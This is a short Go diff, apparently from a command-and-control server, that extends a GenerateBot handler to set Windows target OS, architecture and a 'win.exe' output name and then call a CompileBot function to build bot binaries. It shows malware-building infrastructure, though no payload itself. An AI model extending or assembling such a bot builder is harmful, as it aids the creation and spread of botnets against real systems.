@@ -168,12 +168,16 @@ func (c *c2) GenerateBot(w http.ResponseWriter, r *http.Request) {
 	}
 
 	json.Unmarshal(body, &rot)
-	// ot := models.Ostype{}
+	ot := models.Ostype{}
 	switch rot.os {
 	case "windows":
+		ot.Goos = "windows"
+		ot.Output = "win.exe"
 		switch rot.arch {
 		case "32":
+			ot.Goarch = "386"
 		case "64":
+			ot.Goarch = "amd64"
 		}
 	case "linux":
 	}
@@ -183,6 +187,8 @@ func (c *c2) GenerateBot(w http.ResponseWriter, r *http.Request) {
 		log.Println(err)
 		return
 	}
+
+	botcreds.CompileBot(ot)
 
 	c.Db.SaveToDB(botcreds)
 }
